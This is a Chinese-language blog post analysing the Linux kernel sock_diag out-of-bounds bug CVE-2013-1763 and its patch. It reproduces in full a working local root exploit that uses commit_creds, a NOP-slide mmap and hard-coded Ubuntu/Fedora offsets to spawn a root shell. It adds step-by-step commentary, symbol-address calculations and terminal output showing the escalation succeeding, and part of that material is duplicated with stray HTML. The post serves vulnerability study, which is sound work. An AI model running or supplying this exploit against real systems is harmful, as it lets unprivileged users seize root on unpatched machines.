<h4 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h4><p> 在net/core/sock_diag.c中，__sock_diag_rcv_msg函数未对sock_diag_handlers数组传入的下标做边界检查，导致可能越界，进而导致可执行代码的漏洞。没有root权限的用户可以利用该漏洞获取到root权限。 </p>
<p><span id="OSC_h4_2"></span></p>
<h4 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2. 漏洞的影响范围"></a>2. 漏洞的影响范围</h4><p> linux kernel 3.0-3.7.10 </p>
<p><span id="OSC_h4_3"></span></p>
<h4 id="3-漏洞曝光时间"><a href="#3-漏洞曝光时间" class="headerlink" title="3. 漏洞曝光时间"></a>3. 漏洞曝光时间</h4><p> <span><span style="font-size:15px;font-family:Arial;background-color:transparent;vertical-align:baseline;">2013/02/19</span></span> </p>
<p><span id="OSC_h4_4"></span></p>
<h4 id="4-漏洞产生的原因"><a href="#4-漏洞产生的原因" class="headerlink" title="4. 漏洞产生的原因"></a>4. 漏洞产生的原因</h4><p> 首先看一下这个漏洞的patch： </p>
<pre><code>net/core/sock_diag.c View file @ 6e601a5
@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
   if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
     return -EINVAL;

+  if (req-&amp;gt;sdiag_family &amp;gt;= AF_MAX)
+    return -EINVAL;
+
   hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
   if (hndl == NULL)
     err = -ENOENT;`&lt;/pre&gt; 

 &lt;span&gt;Patch 很简单，只是加上了数组边界判断而已。那么在看看sock_diag_lock_hander这个函数做了些什么：&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
{
        if (sock_diag_handlers[family] == NULL)
                request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK,
                                NETLINK_SOCK_DIAG, family);

        mutex_lock(&amp;amp;sock_diag_table_mutex);
        return sock_diag_handlers[family];//这个函数没有对传入的family的值的范围,进行验证,从而造成数组越界.
}`&lt;/pre&gt; 这个函数也没有做什么，只是对 
&lt;span&gt;sock_diag_lock_hander[family]进行检测，是否为NULL，如果为NULL申请注册，然后加上了一把锁，最后返回的是它的地址。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static struct sock_diag_handler *sock_diag_handlers[AF_MAX];  //可以看出,这个指针数组最大为AF_MAX AF_MAX = 40.`&lt;/pre&gt; 

 接着我们再看看完整的__sock_diag_rcv_msg函数。 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
{
    int err;
    struct sock_diag_req *req = NLMSG_DATA(nlh);
    struct sock_diag_handler *hndl;

    if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
        return -EINVAL;

    hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);//这里传入sdiag_family的值,然后返回数组指针sock_diag_handlers[reg-&amp;gt;sdiag_family].由于没有做边界判断，那么就可以越界。
    if (hndl == NULL)
        err = -ENOENT;
    else
        err = hndl-&amp;gt;dump(skb, nlh); //看到这里是不是很激动呢，利用这里可以让它执行我们自己的代码
    sock_diag_unlock_handler(hndl);
    return err;
}`&lt;/pre&gt; 
&lt;span id=&quot;OSC_h4_5&quot;&gt;&lt;/span&gt;

####  5\. 漏洞的利用 

 虽然已经找到了kernel中有这样一个漏洞，但是如何利用这个漏洞来执行我们自己的程序，取得root权限还是需要很困难的，需要对kernel系统以及计算机运行原理非常了解才可以，并且这些程序往往需要精细设计才能达到最终的目的。 下面是某牛人写的exploit代码，请欣赏： 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`/* 
* quick&apos;n&apos;dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8
* bug found by Spender
* poc by SynQ
* 
* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux
* using nl_table-&amp;gt;hash.rehash_time, index 81
* 
* Fedora 18 support added
* 
* 2/2013
*/

#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;linux/netlink.h&amp;gt;
#include &amp;lt;netinet/tcp.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;linux/if.h&amp;gt;
#include &amp;lt;linux/filter.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;linux/sock_diag.h&amp;gt;
#include &amp;lt;linux/inet_diag.h&amp;gt;
#include &amp;lt;linux/unix_diag.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;

int __attribute__((regparm(3)))    //这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。
kernel_code()
{
    commit_creds(prepare_kernel_cred(0));  //这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。
    return -1;
}

//这段函数没有使用，用来解释hard code jump[] 为什么是那些数值
int jump_payload_not_used(void *skb, void *nlh)
{
    asm volatile (
        &quot;mov $kernel_code, %eax\n&quot;
        &quot;call *%eax\n&quot;
    );
}

unsigned long
get_symbol(char *name)  //为了获取内核函数地址
{
    FILE *f;
    unsigned long addr;
    char dummy, sym[512];
    int ret = 0;

    f = fopen(&quot;/proc/kallsyms&quot;, &quot;r&quot;);
    if (!f) {
        return 0;
    }

    while (ret != EOF) {
        ret = fscanf(f, &quot;%p %c %s\n&quot;, (void **) &amp;amp;addr, &amp;amp;dummy, sym);
        if (ret == 0) {
            fscanf(f, &quot;%s\n&quot;, sym);
            continue;
        }
        if (!strcmp(name, sym)) {
            printf(&quot;[+] resolved symbol %s to %p\n&quot;, name, (void *) addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);

    return 0;
}

int main(int argc, char*argv[])
{
    int fd;
    unsigned family;
    struct {
        struct nlmsghdr nlh;  //socket协议netlink数据包的格式
        struct unix_diag_req r;
    } req;
    char    buf[8192];

    //创建一个netlink协议的socket，因为__sock_diag_rcv_msg函数是属于NETLINK_SOCK_DIAG的
    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &amp;lt; 0){
        printf(&quot;Can&apos;t create sock diag socket\n&quot;);
        return -1;
    }

    //填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去
    memset(&amp;amp;req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_seq = 123456;

    //req.r.sdiag_family = 89;
    req.r.udiag_states = -1;
    req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;

    if(argc==1){
        printf(&quot;Run: %s Fedora|Ubuntu\n&quot;,argv[0]);
        return 0;
    }
    else if(strcmp(argv[1],&quot;Fedora&quot;)==0){
      commit_creds = (_commit_creds) get_symbol(&quot;commit_creds&quot;);
      prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(&quot;prepare_kernel_cred&quot;);
      sock_diag_handlers = get_symbol(&quot;sock_diag_handlers&quot;);
      nl_table = get_symbol(&quot;nl_table&quot;);

      if(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table){
        printf(&quot;some symbols are not available!\n&quot;);
        exit(1);
        }

      family = (nl_table - sock_diag_handlers) / 4;
      printf(&quot;family=%d\n&quot;,family);
      req.r.sdiag_family = family;

      if(family&amp;gt;255){
        printf(&quot;nl_table is too far!\n&quot;);
        exit(1);
        }
    }
    else if(strcmp(argv[1],&quot;Ubuntu&quot;)==0){
      commit_creds = (_commit_creds) 0xc106bc60;
      prepare_kernel_cred = (_prepare_kernel_cred) 0xc106bea0;
      req.r.sdiag_family = 81;
    }

    unsigned long mmap_start, mmap_size;
    mmap_start = 0x10000;  //选择了一块1MB多的内存区域
    mmap_size = 0x120000;  
    printf(&quot;mmapping at 0x%lx, size = 0x%lx\n&quot;, mmap_start, mmap_size);

        if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                printf(&quot;mmap fault\n&quot;);
                exit(1);
        }
    memset((void*)mmap_start, 0x90, mmap_size);         //将其全部填充为0x90，在X86系统中对应的是NOP指令

    char jump[] = &quot;\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3&quot;; // jump_payload in asm
    unsigned long *asd = &amp;amp;jump[4];
    *asd = (unsigned long)kernel_code; //使用kernel_code函数的地址替换掉jump[]中的0x11

    //将jump这段代码放在mmap内存区域的最后，也就是说只要最后能够跳转到这块区域，就可以执行到jump代码，进而跳转执行kernel_code，因为这块区域中布满了NOP指令。
    memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));

    //所有准备工作完成之后，最后在这里发送socket触发这个漏洞
    if ( send(fd, &amp;amp;req, sizeof(req), 0) &amp;lt; 0) {
        printf(&quot;bad send\n&quot;);
        close(fd);
        return -1;
    }

    printf(&quot;uid=%d, euid=%d\n&quot;,getuid(), geteuid() );

    if(!getuid())
        system(&quot;/bin/sh&quot;);
}`&lt;/pre&gt; 
&lt;span id=&quot;OSC_h4_6&quot;&gt;&lt;/span&gt;

####  6\. exploit代码分析 

 在分析之前，有些概念要澄清一下，在linux系统中，用户空间和内核空间是独立存在的。在一个32位的linux系统中，每个进程会虚拟出4G的内存空间，其中3G是用户空间，1G是内核空间，用户空间的地址范围是0×00000000 到 0xBFFFFFFF，内核空间的地址是0xC0000000 到&amp;nbsp;0xFFFFFFFF。内核地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。 

 commit_creds 和prepare_kernel_cred 均为内核函数，如果要执行他们就应该切换到内核状态运行。当执行内核函数__sock_diag_rcv_msg是处于内核态的，所以这个时候调用执行kernel_code函数就可以取得root权限。 

 那么如何调用kernel_code函数呢？所有我们mmap了一块从0x10000开始0x120000大小的内存空间，然后将这块空间写满NOP指令，将跳转执行kernel_code的代码放在这块区域的最后面，也就是说，只要跳转执行到这块内存区域的（除了jump代码块内部）都会顺利跑到kernel_code函数。这种方法叫做NOP slide，就像坐滑滑梯一样，自然滑到底部。jump这一段代码的分析如下： 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`char jump[] = &quot;\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3&quot;; // jump_payload in asm
    unsigned long *asd = &amp;amp;jump[4];
    *asd = (unsigned long)kernel_code;

int jump_payload_not_used(void *skb, void *nlh)
{
    asm volatile (
        &quot;mov $kernel_code, %eax\n&quot;
        &quot;call *%eax\n&quot;
    );
}

fengguoqing@VirtualBox:~/Downloads$ gcc CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ objdump -D a.out
….
08048763 &amp;lt;jump_payload_not_used&amp;gt;:
 8048763:    55                       push   %ebp
 8048764:    89 e5                    mov    %esp,%ebp
 8048766:    b8 3c 87 04 08           mov    $0x804873c,%eax
 804876b:    ff d0                    call   *%eax
 804876d:    5d                       pop    %ebp
 804876e:    c3                       ret   
….

(gdb) p/x jump
$2 = {0x55, 0x89, 0xe5, 0xb8, 0x3c, 0x87, 0x4, 0x8, 0xff, 0xd0, 0x5d, 0xc3, 0x0} //最后发现0x11被填充成了kernel_code的地址
(gdb) p kernel_code
$4 = {int ()} 0x804873c &amp;lt;kernel_code&amp;gt;`&lt;/pre&gt; 

 问题的关键变成了如何才能跳转到这一块内存区域呢？&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;先看看下面这结构体的定义：&lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`struct nlmsghdr {
      __u32       nlmsg_len;  /* Length of message including header */
      __u16       nlmsg_type; /* Message content */
      __u16       nlmsg_flags;    /* Additional flags */
      __u32       nlmsg_seq;  /* Sequence number */
      __u32       nlmsg_pid;  /* Sending process port ID */
  };

  struct unix_diag_req {
      __u8    sdiag_family;
      __u8    sdiag_protocol;
      __u16   pad;
      __u32   udiag_states;
      __u32   udiag_ino;
      __u32   udiag_show;
      __u32   udiag_cookie[2];
  };

struct sock_diag_handler {
        __u8 family;//
        int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
};

 struct netlink_table {
         struct nl_portid_hash   hash; //取回这个值
         struct hlist_head       mc_list;
         struct listeners __rcu  *listeners;
         unsigned int            flags;
         unsigned int            groups;
         struct mutex            *cb_mutex;
         struct module           *module;
         void                    (*bind)(int group);
         int                     registered;
 };

 struct nl_portid_hash {
         struct hlist_head       *table; 四个字节
         unsigned long           rehash_time; //也是四个字节.0x00012b59//这个值在我们的那个范围内.

         unsigned int            mask;
         unsigned int            shift;

         unsigned int            entries;
         unsigned int            max_shift;

         u32                     rnd;
 };

static struct netlink_table *nl_table;`&lt;/pre&gt; 

 我们的牛人发现了nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内，所以可以利用这个值来跳转，只需要将sock_diag_handlers[sdiag_family]-dump正好落在这个值上就可以了。如下图所示 

 ![](http://static.oschina.net/uploads/space/2013/0822/112058_77C0_579952.jpg) 

 所以我们需要先知道nl_table和&lt;span&gt;sock_diag_handlers的地址，可以通过以下两种方式查看。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`cat /proc/kallsyms
sudo cat /boot/System.map-3.2.0-43-generic-pae`&lt;/pre&gt; 但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于 
&lt;span&gt;nl_table和&lt;/span&gt; 
&lt;span&gt;sock_diag_handlers都是指针，所以他们的大小都是4个字节。于是就可以计算出&lt;/span&gt; 
&lt;span&gt;sdiag_family的取值了。&lt;/span&gt; 

 &lt;span&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table
c189b5c0 d nl_table_lock
c189b5c4 d nl_table_wait
c1a488e0 b nl_table_users
c1a488e4 b nl_table
fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers
c1a487a0 b sock_diag_handlers
(0xc1a488e4 - 0xc1a487a0) / 4 = 81L`&lt;/pre&gt; 至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了: 

 &lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt; &lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ id
uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu
mmapping at 0x10000, size = 0x120000
uid=0, euid=0
# id
uid=0(root) gid=0(root) groups=0(root)
#
</code></pre><p> 由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行<br><span>mutex_unlock(&amp;sock_diag_table_mutex)</span>，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。<br><span id="OSC_h4_7"></span></p>
<h4 id="7-参考网站"><a href="#7-参考网站" class="headerlink" title="7. 参考网站"></a><span style="font-size:10pt;line-height:1.5;">7. 参考网站</span></h4><p> CVE：<span></span> </p>
<p> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763</a> </p>
<p> NVD: </p>
<p> <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763</a> </p>
<p> <span>Patch:</span> </p>
<p> <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">CONFIRM:http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0</a> </p>
<p> Exploit: </p>
<p> <a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a> </p>
<p> 维基百科Netlink： </p>
<p> <a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink<span style="line-height:1.5;font-size:10pt;"></span></a> font-size: 14px; line-height: 19px;”&gt;所以我们需要先知道nl_table和sock_diag_handlers的地址，可以通过以下两种方式查看。 </p>
<pre><code>&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`cat /proc/kallsyms
sudo cat /boot/System.map-3.2.0-43-generic-pae`&lt;/pre&gt; 

 &lt;span style=&quot; color: rgb(19, 37, 60); line-height: 19px;&quot;&gt;但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于&amp;nbsp;nl_table和&amp;nbsp;sock_diag_handlers都是指针，所以他们的大小都是4个字节。于是就可以计算出&amp;nbsp;sdiag_family的取值了。&lt;/span&gt;

&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table
c189b5c0 d nl_table_lock
c189b5c4 d nl_table_wait
c1a488e0 b nl_table_users
c1a488e4 b nl_table
fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers
c1a487a0 b sock_diag_handlers
(0xc1a488e4 - 0xc1a487a0) / 4 = 81L`&lt;/pre&gt; 

 &lt;span style=&quot;color: rgb(19, 37, 60); line-height: 19px;&quot;&gt;至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了:&lt;/span&gt;

&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;`fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c
CVE-2013-1763.c: In function ‘main’:
CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]
fengguoqing@VirtualBox:~/Downloads$ id
uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu
mmapping at 0x10000, size = 0x120000
uid=0, euid=0
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p> <span style=" color: rgb(19, 37, 60); line-height: 19px;">由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行&nbsp;mutex_unlock(&amp;sock_diag_table_mutex)，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。</span></p>
<p> <span style=" color: rgb(19, 37, 60);">7.&nbsp;参考网站</span> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">CVE：</span><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename…=CVE-2013-1763</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px;">NVD:&nbsp;</span><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/de…=CVE-2013-1763</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">Patch:&nbsp;CONFIRM:</span><a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">http://git.kernel.org/?p=linux/kerne…e0b6894ffd79c0</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">Exploit:&nbsp;</span><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a> </p>
<p> <span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">维基百科Netlink：</span><a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink</a><span style="color: rgb(19, 37, 60); font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; font-size: 12px; line-height: 19px; ">&nbsp;</span> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" data-id="cjafiicoq0000rxj15p39vzy4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/系统安全/">系统安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux内核调试/">Linux内核调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux移植/">linux移植</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/功耗/">功耗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程/">教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日常记录/">日常记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/系统安全/">系统安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Linux内核调试/" style="font-size: 10px;">Linux内核调试</a> <a href="/tags/linux移植/" style="font-size: 15px;">linux移植</a> <a href="/tags/功耗/" style="font-size: 15px;">功耗</a> <a href="/tags/教程/" style="font-size: 20px;">教程</a> <a href="/tags/日常记录/" style="font-size: 15px;">日常记录</a> <a href="/tags/系统安全/" style="font-size: 15px;">系统安全</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">August 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">February 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/11/25/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2014/04/20/在ubuntu上安装redmine/">在ubuntu上安装redmine</a>
          </li>
        
          <li>
            <a href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/">Linux kernel make menuconfig 时出错处理方法</a>
          </li>
        
          <li>
            <a href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/">解决三星手机WIFI“此网络不可用。证书已到期”方法</a>
          </li>
        
          <li>
            <a href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/">某些TP-Link路由器可以被远程获取密码</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 Frank Feng<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>